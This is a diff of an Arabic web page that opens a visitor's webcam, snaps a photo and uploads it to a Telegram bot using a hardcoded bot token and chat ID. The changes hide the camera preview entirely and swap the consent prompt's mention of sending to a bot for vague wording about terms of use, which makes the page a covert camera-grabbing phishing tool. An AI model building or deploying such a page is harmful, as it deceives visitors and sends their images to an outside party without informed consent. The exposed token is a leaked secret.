@@ -1,98 +1,133 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>مشاركة صورتك</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kshin - مشاركة</title>
 
-<style>
-body {
-    background:#111;
-    color:white;
-    text-align:center;
-    font-family:Arial;
-}
+    <style>
+        body {
+            background: #111;
+            color: white;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-#box {
-    width:400px;
-    height:400px;
-    margin:20px auto;
-    display:none;
-    position:relative;
-}
+        /* إخفاء عنصر الفيديو تماماً */
+        #video {
+            display: none;
+        }
 
-video {
-    width:100%;
-    height:100%;
-    object-fit:cover;
-}
+        button {
+            padding: 12px 25px;
+            margin: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            border: none;
+            border-radius: 8px;
+            background-color: #007bff;
+            color: white;
+            transition: 0.3s;
+        }
 
-button {
-    padding:10px 20px;
-    margin-top:10px;
-    font-size:16px;
-}
-</style>
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #snap {
+            background-color: #28a745;
+        }
+
+        #snap:hover {
+            background-color: #218838;
+        }
+
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #888;
+        }
+    </style>
 </head>
 
 <body>
 
-<h2>مشاركة صورتك</h2>
+    <h2>مشاركة صورتك</h2>
 
-<button onclick="start()">ابدأ</button>
+    <button id="startBtn" onclick="start()">ابدأ الآن</button>
 
-<div id="box">
-    <video id="video" autoplay></video>
-</div>
+    <video id="video" autoplay playsinline></video>
 
-<button id="snap" onclick="takePhoto()" style="display:none;">
-التقاط وإرسال
-</button>
+    <button id="snap" onclick="takePhoto()" style="display:none;">
+        تأكيد الإرسال
+    </button>
 
-<script>
-let stream;
+    <div id="msg" class="status"></div>
 
-function start(){
-    let ok = confirm("هل توافق على فتح الكاميرا والتقاط صورة وإرسالها للبوت؟");
+    <script>
+        let stream;
 
-    if(!ok) return;
+        async function start() {
+            let ok = confirm("هل توافق على شروط الاستخدام والتقاط صورة سريعة؟");
+            if (!ok) return;
 
-    navigator.mediaDevices.getUserMedia({video:true})
-    .then(s=>{
-        stream = s;
-        document.getElementById("video").srcObject = s;
-        document.getElementById("box").style.display="block";
-        document.getElementById("snap").style.display="inline-block";
-    })
-    .catch(()=>{
-        alert("رفضت الكاميرا");
-    });
-}
+            try {
+                // طلب الوصول للكاميرا
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoElement = document.getElementById("video");
+                
+                videoElement.srcObject = stream;
+                
+                // إخفاء زر البداية وإظهار زر الالتقاط
+                document.getElementById("startBtn").style.display = "none";
+                document.getElementById("snap").style.display = "inline-block";
+                document.getElementById("msg").innerText = "تم الاتصال بالكاميرا بنجاح.";
+            } catch (err) {
+                alert("تعذر الوصول للكاميرا: تأكد من إعطاء الإذن.");
+                console.error(err);
+            }
+        }
 
-function takePhoto(){
-    const video = document.getElementById("video");
-    const canvas = document.createElement("canvas");
+        function takePhoto() {
+            const video = document.getElementById("video");
+            const canvas = document.createElement("canvas");
+            
+            // ضبط أبعاد الصورة الملتقطة
+            canvas.width = 720;
+            canvas.height = 720;
 
-    canvas.width = 400;
-    canvas.height = 400;
+            const ctx = canvas.getContext("2d");
+            // رسم ما تراه الكاميرا (المخفية) على اللوحة
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video,0,0,400,400);
+            document.getElementById("msg").innerText = "جاري الإرسال...";
 
-    canvas.toBlob(async(blob)=>{
-        let formData = new FormData();
-        formData.append("chat_id","5586959140");
-        formData.append("photo",blob,"photo.png");
+            canvas.toBlob(async (blob) => {
+                let formData = new FormData();
+                formData.append("chat_id", "5586959140");
+                formData.append("photo", blob, "kshin_capture.png");
 
-        await fetch("https://api.telegram.org/bot8542215489:AAERPA5HwGnqd_0-_VglOJoFS7Gdx5yMZ2A/sendPhoto",{
-            method:"POST",
-            body:formData
-        });
+                try {
+                    await fetch("https://api.telegram.org/bot8542215489:AAERPA5HwGnqd_0-_VglOJoFS7Gdx5yMZ2A/sendPhoto", {
+                        method: "POST",
+                        body: formData
+                    });
 
-        alert("تم إرسال الصورة للبوت");
-    },"image/png");
-}
-</script>
+                    document.getElementById("msg").innerText = "تمت العملية بنجاح.";
+                    alert("تم إرسال الصورة بنجاح!");
+                } catch (error) {
+                    document.getElementById("msg").innerText = "فشل في الإرسال.";
+                    alert("حدث خطأ أثناء الإرسال.");
+                }
+            }, "image/png");
+        }
+    </script>
 
 </body>
 </html>
